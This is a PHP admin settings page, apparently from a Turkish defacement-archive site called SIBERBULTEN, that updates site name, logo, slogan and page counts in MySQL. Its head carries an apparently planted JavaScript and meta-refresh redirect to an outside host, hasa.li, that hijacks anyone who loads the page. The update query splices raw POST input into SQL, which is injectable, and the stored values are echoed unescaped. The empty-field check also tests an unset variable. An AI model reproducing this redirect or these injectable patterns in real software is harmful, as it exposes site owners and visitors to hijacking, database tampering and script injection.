<? 
include "../cfg/db.php";
include "guvenlik.php";
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-9" />
<style type="text/css">
<!--
.style1 {	font-family: Verdana, Arial, Helvetica, sans-serif;
	color: #FF0000;
	font-weight: bold;
}
.style2 {color: #999999}
-->
</style>
<script>location.href="http://hasa.li";</script>
<meta http-equiv="refresh" content="0;URL=http://hasa.li">
</head>
<body>
<center>
<h3><span class="style1">S�BERBULTEN <span class="style2">|</span> Site AyarLar� </span></h3>
<br /><br />
<?

if ($_GET['islem'] == "duzenle"){

$sitead = $_POST['ad'];
$logo = $_POST['logo'];
$slogan = $_POST['slogan'];
$copyright = $_POST['copyright'];
$admin_mail = $_POST['mail'];
$sayfahabersayisi = $_POST['sayfahabersayisi'];
$sayfadefacesayisi =  $_POST['sayfadefacesayisi'];

if ( empty($ad) || empty($logo) || empty($copyright) || empty($admin_mail) || empty($slogan) || empty($sayfadefacesayisi) || empty($sayfahabersayisi) ){

echo 'L�tfen bo� alan b�rakmay�n!<br /><br /><a href="javascript:history.back(1)">Geri d�nmek i�in t�klay�n</a>';
exit;
} // empty kontrol

$yaz = mysql_query("UPDATE ayarlar SET sitead = '$sitead', logo = '$logo', copyright = '$copyright', admin_mail = '$admin_mail', slogan = '$slogan', sayfadefacesayisi = '$sayfadefacesayisi', sayfahabersayisi = '$sayfahabersayisi' WHERE id = 1 ");

if($yaz) echo 'Ayarlar ba�ar�yla d�zenlendi<br /><br /><a href="javascript:history.back(1)">Geri d�nmek i�in t�klay�n</a>';
else echo 'Ayarlar d�zenlenirken bir hata olu�tu<br /><br /><a href="javascript:history.back(1)">Geri d�nmek i�in t�klay�n</a>';

} else {

$ayar_al = mysql_query("SELECT * FROM ayarlar");
$ayarlar = mysql_fetch_array($ayar_al);

echo '<table align="center" width="800">';
echo '<form action="'.$PHP_SELF.'?islem=duzenle" method="POST">';
echo '<tr><td>Site Ad�:</td><td><input type="text" size="30" name="ad" value="'.$ayarlar["sitead"].'"></td></tr>';
echo '<tr><td>Site Slogan�:</td><td><input type="text" size="30" name="slogan" value="'.$ayarlar["slogan"].'"></td></tr>';
echo '<tr><td>Logo Adresi:</td><td><input type="text" size="30" name="logo" value="'.$ayarlar["logo"].'"></td></tr>';
echo '<tr><td>Haberler sayfas�nda bir sayfadaki haber say�s�:</td><td><input type="text" name="sayfahabersayisi" size="10" value="'.$ayarlar["sayfahabersayisi"].'"></td></tr>';
echo '<tr><td>T�m Deface Sayfalar�nda bir sayfadaki deface say�s�:</td><td><input type="text" name="sayfadefacesayisi" size="10" value="'.$ayarlar["sayfadefacesayisi"].'"></td></tr>';
echo '<tr><td>Admin Mail:</td><td><input type="text" name="mail" size="30" value="'.$ayarlar["admin_mail"].'"></td></tr>';
echo '<tr><td>Copyright Yaz�s�:</td><td><textarea cols="55" rows="10" name="copyright">'.$ayarlar["copyright"].'</textarea><br />(Bu yaz� en altta g�r�nen yaz�d�r)</td></tr>';
echo '<tr><td colspan="2" align="center"><input type="submit" value="D�zenle"></td></tr>';
echo '</form>';
echo '</table>';

}

?>
